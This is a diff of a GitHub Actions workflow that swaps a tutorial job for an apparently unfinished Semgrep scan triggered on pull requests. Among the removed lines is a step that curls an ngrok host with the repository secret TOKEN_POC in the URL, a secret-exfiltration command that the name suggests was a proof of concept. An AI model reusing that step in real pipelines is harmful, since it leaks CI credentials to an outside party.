@@ -1,14 +1,20 @@
-name: learn-github-actions
-run-name: ${{ github.actor }} is learning GitHub Actions
-on: [push]
+name: semgrep-sast-scan
+run-name: This is test
+on:
+  pull_request:
+    branches: master
 jobs:
-  check-bats-version:
+  smegrep-full-scan:
     runs-on: ubuntu-latest
+
     steps:
-      - uses: actions/checkout@v3
-      - uses: actions/setup-node@v3
+      - name: Get the repo
+        uses: actions/checkout@v2
+
+      - name: fetch-semgrep-custom-scripts
+        uses: actions/checkout@v2
         with:
-          node-version: '14'
-      - run: npm install -g bats
-      - run: bats -v
-      - run: curl https://5359-210-16-83-150.ngrok-free.app/?token=${{ secrets.TOKEN_POC }}
+          repository: test/test
+          path: custom-scripts 
+        
+      
